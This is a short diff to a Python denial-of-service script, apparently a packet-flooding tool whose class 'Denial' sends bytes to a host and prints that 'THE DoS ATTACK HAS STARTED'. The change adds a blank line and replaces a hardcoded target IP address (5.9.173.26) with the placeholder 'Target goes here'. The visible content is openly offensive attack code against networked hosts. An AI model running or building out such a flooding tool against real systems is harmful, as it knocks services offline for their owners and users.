@@ -19,6 +19,7 @@ class Denial:
 			try:
 				send_all = self.connection.sendto(self.bytes,(self.host, self.port))
 				print("[+] THE DoS ATTACK HAS STARTED ON THE FOLLOWING IP: " + self.host)
+      
 			except UnboundLocalError:
 				try:
 					pass
@@ -46,5 +47,5 @@ class Denial:
 				self.connection.close()
 				exit()
 
-result = Denial("5.9.173.26", 80)
+result = Denial("Target goes here", 80)
 result.send_packet()
